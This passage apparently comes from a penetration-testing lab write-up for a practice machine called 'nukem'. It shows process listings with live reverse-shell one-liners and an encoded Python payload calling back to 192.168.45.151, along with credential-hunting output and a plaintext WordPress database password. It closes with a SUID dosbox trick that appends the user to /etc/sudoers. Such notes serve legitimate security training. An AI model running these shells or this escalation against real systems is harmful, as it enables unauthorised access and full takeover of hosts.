http         892  0.0  0.4  10724  8640 ?        S    19:00   0:00 python3 -c import os,pty,socket;s=socket.socket();s.connect(("192.168.45.151",80));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")
http         893  0.0  0.1   4428  3784 pts/1    Ss+  19:00   0:00 /bin/bash
http         929  0.0  0.4  10724  8540 ?        S    19:00   0:00 python3 -c import os,pty,socket;s=socket.socket();s.connect(("192.168.45.151",80));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")
http         930  0.0  0.1   4428  3552 pts/2    Ss+  19:00   0:00 /bin/bash
http         931  0.0  0.6  74584 13680 ?        S    19:00   0:00 /usr/bin/httpd -k start -DFOREGROUND
http         950  0.0  0.6  74452 13324 ?        S    19:06   0:00 /usr/bin/httpd -k start -DFOREGROUND
http         963  0.0  0.6  74452 13332 ?        S    19:10   0:00 /usr/bin/httpd -k start -DFOREGROUND
http        1013  0.0  0.1   4164  2908 ?        S    19:14   0:00 sh -c 0<&196;exec 196<>/dev/tcp/192.168.45.151/80; bash <&196 >&196 2>&196
http        1014  0.0  0.1   4164  3092 ?        S    19:14   0:00 bash
http        1042  0.0  0.4  11608  9680 ?        S    19:14   0:00 /usr/sbin/python3 -Wignore -c import base64,zlib;exec(zlib.decompress(base64.b64decode("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")))
http        1043  0.0  0.1   4428  3760 pts/3    Ss   19:14   0:00 /usr/sbin/bash -i
http        1176  0.0  0.1   4084  2940 pts/3    S+   20:12   0:00 bash ./pg_privesc.sh
http        1178  0.0  0.0   4084   268 pts/3    S+   20:12   0:00 bash ./pg_privesc.sh
http        1180  0.0  0.0   2364   648 pts/3    S+   20:12   0:00 tee -a privesc_2026-01-22_201215.txt
root        1209  0.0  0.0      0     0 ?        I    20:12   0:00 [kworker/0:0-memcg_kmem_cache]
http        1239  0.0  0.1   6624  2888 pts/3    R+   20:12   0:00 ps aux

$ ss -tulwn 2>/dev/null
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
icmp6 UNCONN 0      0           *%ens192:58               *:*          
tcp   LISTEN 0      50           0.0.0.0:36445      0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:5000       0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:13000      0.0.0.0:*          
tcp   LISTEN 0      5          127.0.0.1:5901       0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      50              [::]:36445         [::]:*          
tcp   LISTEN 0      80                 *:3306             *:*          
tcp   LISTEN 0      511                *:80               *:*          
tcp   LISTEN 0      128             [::]:22            [::]:*          

[+] netstat -tulnp
$ netstat -tulnp 2>/dev/null
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:36445           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:13000           0.0.0.0:*               LISTEN      556/nginx: worker p 
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::36445                :::*                    LISTEN      -                   
tcp6       0      0 :::3306                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   


```

7.  Software / Packages

```
[+] dpkg -l (first 200)
$ dpkg -l 2>/dev/null | head -n 200

[+] rpm -qa (first 200)
$ rpm -qa 2>/dev/null | head -n 200

```

8. Loot Files & Credentials

```
[+] grep password in /etc (first 50)
$ grep -R "password" /etc 2>/dev/null | head -n 50
/etc/login.defs:#       PASS_MAX_DAYS   Maximum number of days a password may be used.
/etc/login.defs:#       PASS_MIN_DAYS   Minimum number of days allowed between password changes.
/etc/login.defs:#       PASS_WARN_AGE   Number of days warning given before a password expires.
/etc/login.defs:# Max number of login retries if password is bad
/etc/login.defs:# Hash shadow passwords with SHA512.
/etc/sudo.conf:# password prompt for "sudo -A" support.  Sudo does not ship with its
/etc/pam.d/newusers:password    required        pam_unix.so sha512 shadow
/etc/pam.d/rlogin:password   include      system-auth
/etc/pam.d/lightdm-autologin:password    include     system-local-login
/etc/pam.d/usermod:password     required        pam_permit.so
/etc/pam.d/system-remote-login:password  include   system-login
/etc/pam.d/chsh:password        required        pam_permit.so
/etc/pam.d/chgpasswd:password   include         system-auth
/etc/pam.d/userdel:password     required        pam_permit.so
/etc/pam.d/groupmod:password    required        pam_permit.so
/etc/pam.d/shadow:password      required        pam_permit.so
/etc/pam.d/chpasswd:password    required        pam_unix.so sha512 shadow
/etc/pam.d/passwd:#password     required        pam_cracklib.so difok=2 minlen=8 dcredit=2 ocredit=2 retry=3
/etc/pam.d/passwd:#password     required        pam_unix.so sha512 shadow use_authtok
/etc/pam.d/passwd:password      required        pam_unix.so sha512 shadow nullok
/etc/pam.d/system-auth:# Optionally use requisite above if you do not want to prompt for the password
/etc/pam.d/system-auth:-password  [success=1 default=ignore]  pam_systemd_home.so
/etc/pam.d/system-auth:password   required                    pam_unix.so          try_first_pass nullok shadow
/etc/pam.d/system-auth:password   optional                    pam_permit.so
/etc/pam.d/system-login:password   include    system-auth
/etc/pam.d/other:password  required   pam_deny.so
/etc/pam.d/other:password  required   pam_warn.so
/etc/pam.d/system-local-login:password  include   system-login
/etc/pam.d/chfn:password        required        pam_permit.so
/etc/pam.d/vlock:password required pam_unix.so
/etc/pam.d/groupmems:password   include         system-auth
/etc/pam.d/lightdm-greeter:# Can't change password
/etc/pam.d/lightdm-greeter:password  required pam_deny.so
/etc/pam.d/chage:password       required        pam_permit.so
/etc/pam.d/groupadd:password    required        pam_permit.so
/etc/pam.d/useradd:password     required        pam_permit.so
/etc/pam.d/sshd:password  include   system-remote-login
/etc/pam.d/groupdel:password    required        pam_permit.so
/etc/pam.d/polkit-1:password   include      system-auth
/etc/pam.d/lightdm:password    include     system-login
/etc/ssl/misc/tsget.pl:    print STDERR "[-v] [-d] [-k <private_key.pem>] [-p <key_password>] ";
/etc/ssl/misc/tsget:    print STDERR "[-v] [-d] [-k <private_key.pem>] [-p <key_password>] ";
/etc/ssl/openssl.cnf:# input_password = secret
/etc/ssl/openssl.cnf:# output_password = secret
/etc/ssl/openssl.cnf:challengePassword          = A challenge password
/etc/ssl/openssl.cnf.dist:# input_password = secret
/etc/ssl/openssl.cnf.dist:# output_password = secret
/etc/ssl/openssl.cnf.dist:challengePassword             = A challenge password
/etc/php/php.ini:; out of your application such as database usernames and passwords or worse.
/etc/php/php.ini:; Define the anonymous ftp password (your email address). PHP's default setting

[+] web roots
$ ls -la /var/www 2>/dev/null

[+] web creds (first 50)
$ grep -R "password\|db\|user" /var/www 2>/dev/null | head -n 50

[+] text files in /home
$ find /home -type f -name "*.txt" 2>/dev/null
/home/commander/python_rest_flask/requirements.txt
/home/commander/local.txt

[+] history files in /home
$ find /home -type f -name "*history*" 2>/dev/null
/home/commander/.bash_history

[+] ssh keys in /home
$ find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null

[+] sensitive strings in /home (first 50)
$ grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50
/home/commander/python_rest_flask/server.py:        result = {'data': [dict(zip(tuple (query.keys()) ,i)) for i in query.cursor]}
/home/commander/python_rest_flask/server.py:        result = {'data': [dict(zip(tuple (query.keys()) ,i)) for i in query.cursor]}
Binary file /home/commander/python_rest_flask/chinook.db matches

[+] backup files (first 50)
$ find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
/var/log/journal/54ecd58cf3cf489fa4da8e9f52e4440e/user-1000@00062f2fc9efdaf2-90265ba8065642b5.journal~
/var/log/journal/54ecd58cf3cf489fa4da8e9f52e4440e/system@00062f2fc9a2b094-ec04cbb9d7e974a6.journal~
/var/log/journal/54ecd58cf3cf489fa4
```

9.  Containers / Virtualization

```
[+] docker env file
$ ls -la /.dockerenv 2>/dev/null

[+] cgroup hints

```

10. Automated Enumeration 

```
-rw-r--r-- 1 http root 2913 Sep 18  2020 /srv/http/wp-config.php                                                                                                                                                   
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'commander' );
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
define( 'DB_HOST', 'localhost' );

Analyzing VNC Files (limit 70)
drwxr-xr-x 2 commander root 4096 Sep 18  2020 /home/commander/.vnc                                                                                                                                                 
-rw------- 1 commander commander 8 Sep 18  2020 /home/commander/.vnc/passwd

-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox

-rwsr-xr-x 1 root root 44K Sep  7  2020 /usr/bin/sg (Unknown SUID binary!)

/srv/http/.bash_history

```

11. Possible PE Paths

```
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN

command+     402  0.0  3.6 199496 74528 ?        S    17:33   0:00 /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000 

-rwxr-xr-x   1 root root   877 Sep 18  2020 build_arch.sh

git:x:973:973:git daemon user:/:/usr/bin/git-shell

Linux version 5.8.9-arch2-1 (linux@archlinux) (gcc (GCC) 10.2.0, GNU ld (GNU Binutils) 2.35) #1 SMP PREEMPT Sun, 13 Sep 2020 23:44:55 +0000                                                                        
LSB Version:    1.4

Sudo version 1.9.3p1 

root         553  0.0  1.5  44804 31636 ?        Ss   17:35   0:01 /usr/bin/python /home/commander/python_rest_flask/server.py

-rw-r--r-- 1 http root 2913 Sep 18  2020 /srv/http/wp-config.php                                                                                                                                                   
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'commander' );
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
define( 'DB_HOST', 'localhost' );

-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox

-rwsr-xr-x 1 root root 44K Sep  7  2020 /usr/bin/sg (Unknown SUID binary!)

/srv/http/.bash_history

/run/user/1000/systemd/generator.late/app-xfsettingsd-autostart.service
/run/user/1000/systemd/generator.late/xdg-desktop-autostart.target.wants/app-xfsettingsd-autostart.service

```

**Privilege Escalation**

1. PE Steps
- Used credentials found in  /srv/http/wp-config.php to login as commander.

```
su commander
```

- Found suid binary -rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox.

- Using instructions found on gtfobins, trial and error, and a hint, used this command to add commander to the suders file.

```
[commander@nukem ~]$ LFILE = '/etc/sudoers'
-bash: LFILE: command not found
[commander@nukem ~]$ LFILE='/etc/sudoers'
[commander@nukem ~]$ dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >> C:$LFILE" -c exit
DOSBox version 0.74-3

```

![[Pasted image 20260122153140.png]]

- Was able to sudo -su and cat contents of proof.txt

![[Pasted image 20260122153339.png]]
2. Notes

```

```

